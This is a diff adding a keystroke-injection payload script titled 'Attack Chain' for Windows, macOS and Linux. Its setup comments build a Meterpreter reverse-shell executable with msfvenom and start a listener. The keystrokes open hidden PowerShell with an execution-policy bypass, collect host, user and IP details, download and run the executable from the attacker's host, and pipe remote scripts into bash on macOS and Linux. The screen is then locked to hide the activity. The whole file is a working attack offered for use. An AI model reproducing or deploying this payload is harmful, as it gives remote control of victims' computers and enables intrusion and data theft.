@@ -1,0 +1,48 @@
+NAME Attack Chain
+DESCRIPTION Recon, staged reverse shell download, screen lock
+CATEGORY exploit
+PLATFORMS WIN,MAC,LINUX
+OPTION LHOST 192.168.1.100 "Attacker IP (your machine)"
+OPTION LPORT 4444 "Metasploit listener port"
+OPTION WEBPORT 8080 "HTTP server port serving payload"
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+# SETUP: On your machine run:
+#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o s.exe
+#   python3 -m http.server {{WEBPORT}}
+#   msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{LHOST}}; set LPORT {{LPORT}}; exploit'
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass -w hidden
+ENTER
+DELAY 1200
+STRING "HOST:$env:COMPUTERNAME USER:$env:USERNAME IP:$((ipconfig|sls 'IPv4 Address').ToString().Split(':')[1].Trim())" | Out-File $env:TEMP\r.txt
+ENTER
+DELAY 400
+STRING IWR http://{{LHOST}}:{{WEBPORT}}/s.exe -OutFile $env:TEMP\s.exe; Start-Process $env:TEMP\s.exe
+ENTER
+DELAY 1500
+GUI l
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+STRING curl -s http://{{LHOST}}:{{WEBPORT}}/mac.sh | bash &
+ENTER
+DELAY 1500
+GUI SPACE
+DELAY 700
+STRING Lock Screen
+ENTER
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+STRING curl -s http://{{LHOST}}:{{WEBPORT}}/lin.sh | bash &
+ENTER
+DELAY 1500
+CTRL ALT l
